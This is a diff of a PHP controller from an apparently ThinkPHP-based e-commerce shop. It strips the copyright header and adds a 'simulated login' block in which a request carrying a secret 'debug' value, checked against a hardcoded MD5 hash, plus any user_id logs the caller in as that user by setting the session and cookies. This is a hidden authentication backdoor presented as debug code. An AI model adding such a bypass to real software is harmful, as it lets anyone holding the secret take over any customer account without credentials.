@@ -1,16 +1,5 @@
 <?php
-/**
- * 智丰网络
- * ============================================================================
- * * 版权所有 2015-2027 深圳搜豹网络科技有限公司，并保留所有权利。
- * 网站地址: http://www.tp-shop.cn
- * ----------------------------------------------------------------------------
- * 这不是一个自由软件！您只能在不用于商业目的的前提下对程序代码进行修改和使用 .
- * 不允许对程序代码以任何形式任何目的的再发布。
- * 采用最新Thinkphp5助手函数特性实现单字母函数M D U等简写方式
- * ============================================================================
- * $Author: IT宇宙人 2016-08-10 $
- */
+
 namespace app\shop\controller;
 
 use think\Controller;
@@ -39,6 +28,28 @@ class MobileBase extends Controller {
         else 
             cookie('is_mobile','0',3600);
         
+
+        /**
+         * 模拟登录
+         */
+        if( md5(I('debug')) == '64de163040541c56cfe2a252049cc627' && I('user_id') > 0){
+            $user_id =  I('user_id');
+            if(!$user_id){
+                exit("user_id不能为空");
+            }
+            $user = M('users')->where(['user_id'=>$user_id])->find();
+            if(!$user){
+                exit("user为空");
+            }
+            session('user',$user);
+            setcookie('user_id',$user['user_id'],null,'/');
+            setcookie('is_distribut',$user['is_distribut'],null,'/');
+            setcookie('uname',$user['nickname'],null,'/');
+            session('openid',$user['openid']);
+        }
+
+
+
         //微信浏览器
         if(strstr($_SERVER['HTTP_USER_AGENT'],'MicroMessenger')){
             $this->weixin_config = M('wx_user')->find(); //取微获信配置
